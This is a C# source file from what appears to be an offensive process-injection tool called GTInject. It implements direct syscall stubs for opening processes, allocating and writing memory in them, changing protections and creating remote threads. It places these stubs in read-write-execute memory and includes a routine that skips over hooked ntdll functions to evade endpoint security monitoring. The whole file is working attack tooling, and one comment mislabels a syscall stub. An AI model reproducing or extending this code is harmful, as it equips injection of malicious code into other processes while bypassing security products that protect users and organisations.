using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace GTInject.SysCalls
{
    internal class Syscalls
    {

        static IntPtr ntdllBaseAddress = IntPtr.Zero;

        /// <summary>
        /// Gets the base address of ntdll.dll
        /// </summary>
        public static IntPtr NtDllBaseAddress
        {
            get
            {
                if (ntdllBaseAddress == IntPtr.Zero)
                    ntdllBaseAddress = GetNtdllBaseAddress();
                return ntdllBaseAddress;
            }
        }

        static byte[] bNtOpenProcess =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x26, 0x00, 0x00, 0x00,   // mov eax, 0x26 (NtOpenProcess Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtAllocateVirtualMemory =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x18, 0x00, 0x00, 0x00,   // mov eax, 0x18 (NtAllocateVirtualMemory Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtWriteVirtualMemory =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x3a, 0x00, 0x00, 0x00,   // mov eax, 0x3a (NtWriteVirtualMemory Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtCreateThreadEx =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0xc1, 0x00, 0x00, 0x00,   // mov eax, 0xc1 (NtCreateThreadEx Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtProtectVirtualMemory =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x50, 0x00, 0x00, 0x00,   // mov eax, 0x50 (NtCreateThreadEx Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };


        // Review if the RWX here matters - could see about RW / RX changes if that would be better / possible, step through this. 
        public static WinNative.NTSTATUS SysclNtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref SysCalls.WinNative.OBJECT_ATTRIBUTES ObjectAttributes, ref SysCalls.WinNative.CLIENT_ID ClientId)
        {
            // dynamically resolve the syscall
            byte[] syscall = bNtOpenProcess;
            syscall[4] = GetSysCallId("NtOpenProcess");

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!SysCalls.WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtOpenProcess assembledFunction = (Delegates.DelgNtOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtOpenProcess));

                    return (WinNative.NTSTATUS)assembledFunction(ref ProcessHandle, AccessMask, ref ObjectAttributes, ref ClientId);
                }
            }
        }

        public static SysCalls.WinNative.NTSTATUS SysclNtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionZize, UInt32 AllocationType, UInt32 Protect)
        {
            // dynamically resolve the syscall
            byte[] syscall = bNtAllocateVirtualMemory;
            syscall[4] = GetSysCallId("NtAllocateVirtualMemory");

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!SysCalls.WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)SysCalls.WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtAllocateVirtualMemory assembledFunction = (Delegates.DelgNtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtAllocateVirtualMemory));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionZize, AllocationType, Protect);
                }
            }
        }

        public static SysCalls.WinNative.NTSTATUS SysclNtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress, IntPtr buffer, UInt32 Length, ref UInt32 bytesWritten)
        {
            // dynamically resolve the syscall
            byte[] syscall = bNtWriteVirtualMemory;
            syscall[4] = GetSysCallId("NtWriteVirtualMemory");


            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtWriteVirtualMemory assembledFunction = (Delegates.DelgNtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtWriteVirtualMemory));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(hProcess, baseAddress, buffer, (uint)Length, ref bytesWritten);
                }
            }
        }

        public static SysCalls.WinNative.NTSTATUS SysclNtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect)
        {
            // dynamically resolve the syscall
            byte[] syscall = bNtProtectVirtualMemory;
            syscall[4] = GetSysCallId("NtProtectVirtualMemory");

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtProtectVirtualMemory assembledFunction = (Delegates.DelgNtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtProtectVirtualMemory));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(ProcessHandle, ref BaseAddress, ref RegionSize, NewProtect, ref OldProtect);
                }
            }
        }

        public static SysCalls.WinNative.NTSTATUS SysclNtCreateThreadEx(out IntPtr threadHandle, WinNative.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
        {
            // dynamically resolve the syscall
            byte[] syscall = bNtCreateThreadEx;
            syscall[4] = GetSysCallId("NtCreateThreadEx");

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.DelgNtCreateThreadEx assembledFunction = (Delegates.DelgNtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtCreateThreadEx));

                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(out threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList);
                }
            }
        }

        private static IntPtr GetNtdllBaseAddress()
        {
            Process hProc = Process.GetCurrentProcess();

            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().Equals("NTDLL.DLL"))
                {
                    return m.BaseAddress;
                }
            }

            // we can't find the base address
            return IntPtr.Zero;
        }

        public static byte GetSysCallId(string FunctionName)
        {
            // first get the proc address
            IntPtr funcAddress = WinNative.GetProcAddress(NtDllBaseAddress, FunctionName);

            byte count = 0;

            // loop until we find an unhooked function
            while (true)
            {
                // is the function hooked - we are looking for the 0x4C, 0x8B, 0xD1, instructions - this is the start of a syscall
                bool hooked = false;

                var instructions = new byte[5];
                Marshal.Copy(funcAddress, instructions, 0, 5);
                if (!StructuralComparisons.StructuralEqualityComparer.Equals(new byte[3] { instructions[0], instructions[1], instructions[2] }, new byte[3] { 0x4C, 0x8B, 0xD1 }))
                    hooked = true;

                if (!hooked)
                    return (byte)(instructions[4] - count);

                funcAddress = (IntPtr)((UInt64)funcAddress + ((UInt64)32));
                count++;
            }
        }

        struct Delegates
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref WinNative.OBJECT_ATTRIBUTES ObjectAttributes, ref WinNative.CLIENT_ID ClientId);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionZize, UInt32 AllocationType, UInt32 Protect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress, IntPtr buffer, UInt32 Length, ref UInt32 bytesWritten);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            SysCalls.WinNative.NTSTATUS DelgNtCreateThreadEx(out IntPtr threadHandle, WinNative.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);
        };

    }
}
